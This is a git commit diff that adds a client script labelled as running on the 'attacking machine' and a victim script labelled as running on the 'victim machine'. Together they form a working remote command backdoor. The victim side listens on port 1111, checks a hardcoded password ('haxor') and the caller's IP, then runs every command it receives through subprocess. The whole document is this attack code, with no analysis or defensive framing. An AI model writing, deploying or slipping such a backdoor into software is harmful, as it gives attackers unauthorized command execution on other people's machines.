3e11541be8acba5aefde1445dd8e624f510df170
ChrisSmith2 <9710782+ChrisSmith2@users.noreply.github.com>
2022-10-05 01:07:04 -0500

    Basic client + server socket working

--- client.py
+++ client.py
@@ -1,1 +1,22 @@
+import socket
+import os
+import sys
 # this is for the attacking machine
+
+HOST = sys.argv[1] 
+PORT = 1111
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+pwd = sys.argv[2]
+s.send(pwd.encode())
+data = s.recv(1024).decode()
+if data != "authenticated":
+    print(data)
+    exit()
+
+while True:
+    command = input("$ ").strip()
+    s.send(command.encode())
+
+s.close()
--- victim.py
+++ victim.py
@@ -1,4 +1,30 @@
-import os
-import subprocess
-
 # this is for the victim machine
+import sys
+import subprocess
+import socket
+import shlex
+
+CLIENT_IP = sys.argv[1] 
+PORT = 1111
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(("", PORT))
+
+s.listen(2)
+while True:
+    conn, address = s.accept()
+    print("Incoming connection: " + str(address))
+    if address[0] == CLIENT_IP:
+        pwd = conn.recv(4096).decode()
+        if pwd == "haxor":
+            print("Correct password, waiting for commands")
+            conn.send("authenticated".encode())
+            while True:
+                data = conn.recv(4096).decode()
+                if not data:
+                    break
+                subprocess.run(shlex.split(str(data)))
+        else:
+            print("Incorrect password")
+
+conn.close()
